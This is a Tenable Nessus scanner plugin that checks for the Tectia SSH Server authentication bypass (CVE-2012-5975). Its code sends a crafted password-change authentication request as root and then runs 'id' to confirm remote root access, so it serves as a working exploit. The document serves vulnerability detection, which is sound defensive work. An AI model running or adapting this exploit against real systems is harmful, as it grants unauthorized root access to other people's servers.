#TRUSTED 96623f91a2cce41a85353de35d072afc3722c1d5e72f60560c0b2e37987a24e9cbe025f400a7f2be44a8aa71729214806e610baf43fd4fe37efce3a35846b6c4609070294e6937ac74d46eed7af38db5b57c28f06b3fd85b249852f2c34e4aa733b80892a582043c10c2e95741a30094c3c0bf94a2ede2f01a8a33987d698de42637d5e2cc8ab29d746e9ada07aa269ff15426ec963d4953ad8c2d15e58e9b1188360344e558aa63639b5efdf7d513291eaf3466ae6fef814dce46cdc47f73a52ffce2e7bed99b1745bc902c68f39e083154deb23ed0d144f617066f066af4baaa191cbf7f0076347dbf9c4118c50b5b8b0a5b647715b5870665d03b322074c5c771efce86d71a8af78f03498f2be76c00a9128b9552ba0f98762e1f6156561891ac7fc0685ce5ae74d5845b272592fa1cf79e01943d620edc3b2d5599a34de264f03741ec10e84752394298e2bf5b358d6f8ef3a2b1bd499fb241c1336274d46b492315caade6dd8c67515a2d0412b34b3ea49d1e9af74faa91a809ece0925c37d292f310df9507074a448a40a996687c8dd75db61736d3406f527c74ecec4195387b622ca90232bc5066842dd872294433317a21f1843ea1c388ca6b32dbca21728daed56303ab63547efe0b044d7e2ec1c83bc36d3d6104086e20fe1d7ff0a02c6c179b1b7e7cba28ec338276b2f99c8b91e113dcf94234c379792d8d5bc4
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63156);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/07/11");

  script_cve_id("CVE-2012-5975");
  script_bugtraq_id(56783);
  script_xref(name:"EDB-ID", value:"23082");

  script_name(english:"Tectia SSH Server Authentication Bypass");
  script_summary(english:"Tries to bypass auth and run a command");

  script_set_attribute(attribute:"synopsis", value:
"An SSH server running on the remote host is affected by an
authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Tectia SSH Server running on the remote host is
affected by an authentication bypass vulnerability.  A remote,
unauthenticated attacker can bypass authentication by sending a
specially crafted request, allowing the attacker to authenticate as
root.

The software is only vulnerable when running on Unix or Unix-like
operating systems.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2012/Dec/12");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2012/Dec/64");
  # http://answers.tectia.com/questions/2178/can-i-have-info-about-ssh-remote-bypass-vulnerability
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7b7686fa");
  script_set_attribute(attribute:"solution", value:
"Disable password authentication in the ssh-server-config.xml
configuration file (this file needs to be created if it does not
already exist).  Refer to the vendor's advisory for more information.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2012-5975");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Tectia SSH USERAUTH Change Request Password Reset Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/12/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/12/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ssh:tectia_server");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2012-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('misc_func.inc');
include('ssh_func.inc');
include("data_protection.inc");

checking_default_account_dont_report = TRUE;

enable_ssh_wrappers();
user = 'root';

# Unless paranoid, before making any requests, make sure
# the host is not running Windows (reportedly not affected)...
if (report_paranoia < 2 && os = get_kb_item('Host/OS'))
{
  if ('Windows' >< os)
    audit(AUDIT_HOST_NOT, 'Unix/Linux');
}

port = get_service(svc:'ssh', default:22, exit_on_fail:TRUE);

# ...and make sure the SSH service looks like ssh tectia server
if (report_paranoia < 2 && banner = get_kb_item("SSH/banner/" + port))
{
  if ('SSH Tectia Server' >!< banner)
    audit(AUDIT_NOT_LISTEN, 'Tectia SSH Server', port);
}
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# the workaround is to disable password auth. if it's not advertised,
# there's no point in attempting the exploit
authtypes = get_kb_item('SSH/supportedauth/' + port);
if (!isnull(authtypes))
{
  password_auth = FALSE;

  foreach var authtype (split(authtypes, sep:',', keep:FALSE))
  {
    if (authtype == 'password')
      password_auth = TRUE;
  }

  if (!password_auth)
    audit(AUDIT_LISTEN_NOT_VULN, 'SSH', port);
}

if (!get_port_state(port))
  audit(AUDIT_PORT_CLOSED, port);

_ssh_socket = open_sock_tcp(port);
if (!_ssh_socket)
  audit(AUDIT_SOCK_FAIL, port);

# initialization
init();
server_version = ssh_exchange_identification();
if (!server_version)
  audit(AUDIT_FN_FAIL, 'ssh_exchange_identification');

_ssh_server_version = server_version;

# key exchange
ret = ssh_kex2(server_version:server_version, nofingerprint:TRUE);
if (ret != 0)
  audit(AUDIT_FN_FAIL, 'ssh_kex2');

payload = putstring(buffer:"ssh-userauth");
send_ssh_packet(payload:payload, code:sshlib::PROTO_SSH_MSG_SERVICE_REQUEST);

payload = recv_ssh_packet();
if (ord(payload[0]) != sshlib::PROTO_SSH_MSG_SERVICE_ACCEPT)
  audit(AUDIT_RESP_BAD, port, 'SSH2_MSG_SERVICE_REQUEST');

# SSH_MSG_USERAUTH_REQUEST
# http://www.ietf.org/rfc/rfc4252.txt page 10
payload =
  putstring(buffer:user) +
  putstring(buffer:"ssh-connection") +
  putstring(buffer:"password") +
  raw_int8(i:1) +
  putstring(buffer:'') +
  putstring(buffer:'');
send_ssh_packet(payload:payload, code:sshlib::PROTO_SSH_MSG_USERAUTH_REQUEST);

# a response of SSH_MSG_USERAUTH_SUCCESS indicates authentication succeeded.
# otherwise, the system probably isn't vulnerable
payload = recv_ssh_packet();
if (ord(payload[0]) != sshlib::PROTO_SSH_MSG_USERAUTH_SUCCESS)
  audit(AUDIT_LISTEN_NOT_VULN, 'SSH', port);

output = ssh_cmd(cmd:'id', nosh:TRUE, nosudo:TRUE);
if ('uid=' >!< output)
  audit(AUDIT_RESP_BAD, port, 'id');

if (report_verbosity > 0)
{
  report = '\nNessus bypassed authentication and executed "id", which returned :\n\n' +
    data_protection::sanitize_uid(output:output);
  security_hole(port:port, extra:report);
}
else security_hole(port);

